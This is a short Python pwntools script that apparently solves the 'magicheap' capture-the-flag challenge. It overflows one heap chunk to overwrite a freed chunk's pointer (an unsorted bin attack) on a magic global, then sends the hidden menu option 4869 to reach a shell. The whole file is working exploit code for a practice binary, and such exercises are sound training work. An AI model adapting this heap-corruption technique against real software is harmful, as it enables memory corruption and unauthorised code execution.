from pwn import *
context.binary = './magicheap'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./magicheap')

def dbg():
	raw_input()

def create(content):
	size = len(content)
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap:')
	p.send(content)

	print "create a chunk success!"

def delete(idx):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(idx))

	print "delete %d chunk sucess" % idx


def edit(idx, content):
	size = len(content)
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(idx))
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap : ')
	p.send(content)

	print "edit %d chunk success!" % idx


create('a'*0x10)
create('b'*0x80)
create('c'*0x10)				#avoid merge with top chunk

gdb.attach(p, 'b* 0x400C87')
delete(1)						#an unsorted bin

magic_addr = 0x6020C0
edit(0, 'a'*0x10 + p64(0x20) + p64(0x91) + p64(0) + p64(magic_addr-0x10))

create('b'*0x80)			#attack

p.recvuntil('Your choice :')
p.sendline('4869')

p.interactive()
p.close()


